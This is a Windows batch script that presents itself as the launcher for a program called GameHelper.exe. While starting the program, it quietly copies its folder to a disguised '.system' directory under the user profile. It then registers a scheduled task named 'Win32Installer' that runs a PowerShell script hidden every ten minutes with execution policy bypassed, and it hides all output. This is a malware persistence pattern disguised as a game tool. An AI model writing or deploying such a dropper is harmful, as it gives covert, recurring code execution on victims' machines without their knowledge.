@echo off 
cd /d %~dp0 

set "taskname=Win32Installer" 
set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;" 
set "dir=%USERPROFILE%\.system"

rmdir /s /q "%dir%" > nul 2> nul
xcopy "%cd%" "%dir%" /E /I /Y > nul 2> nul

schtasks /create /tn "%taskname%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%dir%\build.ps1\"" /sc minute /mo 10 /st 00:00:00 /f > nul 2> nul
powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul

GameHelper.exe 1